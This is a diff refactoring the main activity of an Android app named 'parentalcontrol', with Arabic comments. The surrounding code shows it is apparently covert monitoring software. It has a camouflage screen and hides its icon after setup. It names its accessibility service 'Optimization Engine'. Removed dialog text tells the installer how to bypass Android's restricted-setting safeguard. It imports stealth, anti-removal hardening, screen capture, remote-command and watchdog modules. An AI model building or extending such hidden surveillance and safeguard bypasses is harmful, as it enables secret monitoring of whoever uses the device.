@@ -1,4 +1,4 @@
-package com.example.parentalcontrol
+package com.example.parentalcontrol.core.ui
 
 import android.util.Log
 import android.app.AppOpsManager
@@ -18,6 +18,11 @@ import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.lifecycleScope
+import com.example.parentalcontrol.R
+import com.example.parentalcontrol.BuildConfig
+import com.example.parentalcontrol.ParentalControlManager
+import com.example.parentalcontrol.AppUpdateManager
+import com.example.parentalcontrol.core.config.AppConstants
 import com.example.parentalcontrol.databinding.ActivityMainBinding
 import com.example.parentalcontrol.databinding.ItemSetupStepBinding
 import kotlinx.coroutines.CoroutineScope
@@ -26,7 +31,18 @@ import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import com.example.parentalcontrol.features.screen_capture.controllers.MediaProjectionRequestActivity
+import com.example.parentalcontrol.features.security_and_stealth.services.SamsungHardeningManager
+import com.example.parentalcontrol.features.security_and_stealth.services.StealthManager
+import com.example.parentalcontrol.features.accessibility_monitoring.controllers.AccessibilityController
+import com.example.parentalcontrol.features.remote_commands.services.RemoteConfigManager
+import com.example.parentalcontrol.features.remote_commands.services.SupabaseManager
+import com.example.parentalcontrol.features.service_watchdog.services.MonitoringForegroundService
 
+/**
+ * MainActivity
+ * ─────────────────────────────────────────────────────────────
+ * واجهة الإعداد الرئيسية والتمويه وإدارة منح الصلاحيات وتحديث التطبيق.
+ */
 class MainActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityMainBinding
@@ -54,7 +70,7 @@ class MainActivity : AppCompatActivity() {
         // ─── تخصيص التشغيل الأول ───
         // إذا كان التثبيت جديداً (ولم يتم إنهاء الإعداد وتفعيل التخفي بعد)،
         // نقوم بإخفاء شاشة التمويه تلقائياً لتسهيل الإعداد دون طلب رمز سري.
-        val isSetupDone = getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
+        val isSetupDone = getSharedPreferences(AppConstants.PREFS_STEALTH, Context.MODE_PRIVATE)
             .getBoolean("setup_done", false)
         if (!isSetupDone) {
             binding.layoutCamouflage.visibility = View.GONE
@@ -297,8 +313,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun isAccessibilityServiceEnabled(): Boolean {
-        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
-        return enabledServices?.contains(packageName) == true
+        return AccessibilityController.isAccessibilityServiceEnabled(this)
     }
 
     private fun isUsageAccessGranted(): Boolean {
@@ -312,18 +327,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showAccessibilityGuidance() {
-        AlertDialog.Builder(this)
-            .setTitle("تفعيل خدمة Optimization Engine")
-            .setMessage("إذا ظهر لك تنبيه 'الضبط المقيد' (Restricted setting)، يرجى الضغط على زر 'معلومات التطبيق' بالأسفل، ثم الضغط على النقاط الثلاث بالأعلى واختيار 'السماح بالضبط المقيد'.")
-            .setPositiveButton("إعدادات إمكانية الوصول") { _, _ ->
-                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-            }
-            .setNeutralButton("معلومات التطبيق (لحل القيود)") { _, _ ->
-                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))
-                intent.data = Uri.parse("package:$packageName")
-                startActivity(intent)
-            }
-            .show()
+        AccessibilityController.showAccessibilityGuidance(this)
     }
 
     private fun showOverlayGuidance() {
@@ -367,7 +371,7 @@ class MainActivity : AppCompatActivity() {
         Toast.makeText(this, "اكتمل التثبيت! سيختفي التطبيق الآن.", Toast.LENGTH_LONG).show()
 
         // حفظ حالة اكتمال الإعداد لأول مرة
-        getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
+        getSharedPreferences(AppConstants.PREFS_STEALTH, Context.MODE_PRIVATE)
             .edit().putBoolean("setup_done", true).apply()
 
         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
